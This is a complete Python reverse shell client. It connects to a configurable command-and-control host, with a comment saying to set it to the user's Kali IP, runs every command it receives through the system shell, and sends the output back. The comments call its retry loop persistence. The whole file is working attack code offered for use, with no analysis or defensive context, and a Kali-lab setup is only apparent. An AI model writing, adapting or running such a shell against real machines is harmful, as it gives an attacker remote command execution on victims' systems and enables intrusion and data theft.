import socket
import subprocess
import time
import os

# CONFIGURATION
C2_IP = "192.168.8.35"  # <--- CHANGE TO YOUR KALI IP
C2_PORT = 7777

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f"[*] Trying to connect to {C2_IP}:{C2_PORT}...")
            s.connect((C2_IP, C2_PORT))
            print("[+] Connected!")
            
            while True:
                # 1. Receive Command
                command = s.recv(1024).decode()
                
                if not command: break # Server closed connection
                
                command = command.strip()
                if command == 'exit':
                    s.close()
                    return 
                
                # 2. Execute Command
                output = b""
                try:
                    # Run command and capture output
                    proc = subprocess.Popen(
                        command, 
                        shell=True, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE, 
                        stdin=subprocess.PIPE
                    )
                    output = proc.stdout.read() + proc.stderr.read()
                except Exception as e:
                    output = str(e).encode()

                # 3. Send Output Back
                if not output:
                    output = b"[+] Command executed (No output)"
                
                s.send(output)
                
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            time.sleep(5) # Wait 5 seconds before trying again (Persistence)
        finally:
            try: s.close()
            except: pass

if __name__ == "__main__":
    connect()